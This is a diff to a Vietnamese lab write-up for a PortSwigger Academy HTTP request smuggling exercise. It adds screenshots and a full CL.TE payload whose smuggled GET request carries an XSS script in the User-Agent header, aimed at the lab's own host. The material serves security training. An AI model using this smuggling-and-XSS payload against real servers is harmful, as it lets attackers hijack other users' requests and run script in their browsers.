@@ -475,3 +475,44 @@ To solve the lab, smuggle a request to the back-end server that causes the next 
 ```
 * Exploit:
 
+- Xác định vị trí mắc lỗi XSS:
+
+<img width="480" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3c87706e-69d8-4cc8-a7e7-b3706a2f04f5">
+=> Truyền vị trí mắc lõi vào vào Smuggling Request:
+
+<img width="477" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f91d859b-def3-4dea-931d-61d06a739227">
+
+Full Payload:
+```
+POST / HTTP/1.1
+Host: 0a0500b1047eb72880183f2f00a6005d.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 151
+Transfer-Encoding: chunked
+
+0
+
+
+GET /post?postId=2 HTTP/1.1
+User-Agent: "><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+a=b
+```
+***
+
+
+
